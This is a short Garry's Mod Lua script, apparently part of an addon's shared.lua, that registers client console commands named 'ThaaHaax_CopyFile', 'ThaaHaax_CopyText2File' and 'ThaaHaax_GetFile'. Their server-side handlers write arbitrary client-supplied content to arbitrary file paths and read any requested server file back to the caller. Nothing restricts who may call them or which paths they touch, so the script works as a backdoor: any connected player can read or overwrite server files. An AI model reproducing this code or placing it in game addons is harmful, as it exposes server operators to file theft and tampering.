if (SERVER) then
	require("datastream")
	AddCSLuaFile("shared.lua")
	local function CopyThaFile(sender, handler, id, encoded, decoded)
		file.Write(decoded[1], decoded[2])
		sender:PrintMessage(HUD_PRINTCONSOLE,"File Written!")
	end
	local function GetThaFile(sender, handler, id, encoded, decoded)
		local datastring = file.Read(decoded[1])
		local writethis = string.Explode("\n", datastring)
		sender:PrintMessage(HUD_PRINTCONSOLE,"-----------------\nData in: ")
		sender:PrintMessage(HUD_PRINTCONSOLE,decoded[1])
		sender:PrintMessage(HUD_PRINTCONSOLE,"-----------------")
		for _,data in pairs(writethis) do
			sender:PrintMessage(HUD_PRINTCONSOLE,data)
		end
		sender:PrintMessage(HUD_PRINTCONSOLE,"-----------------")
	end
	datastream.Hook("FileSending",CopyThaFile)
	datastream.Hook("FileGetting",GetThaFile)
end
if (CLIENT) then
	require("datastream")
	local function CopyFile(player,command,args)
		datastream.StreamToServer("FileSending",{args[2], file.Read(args[1])})
	end
	local function CopyTextFile(player,command,args)
		datastream.StreamToServer("FileSending",{args[1],args[2]})
	end
	local function GetFile(player,command,args)
		datastream.StreamToServer("FileGetting",{args[1]})
	end
	concommand.Add("ThaaHaax_CopyFile",CopyFile)
	concommand.Add("ThaaHaax_CopyText2File",CopyTextFile)
	concommand.Add("ThaaHaax_GetFile",GetFile)
end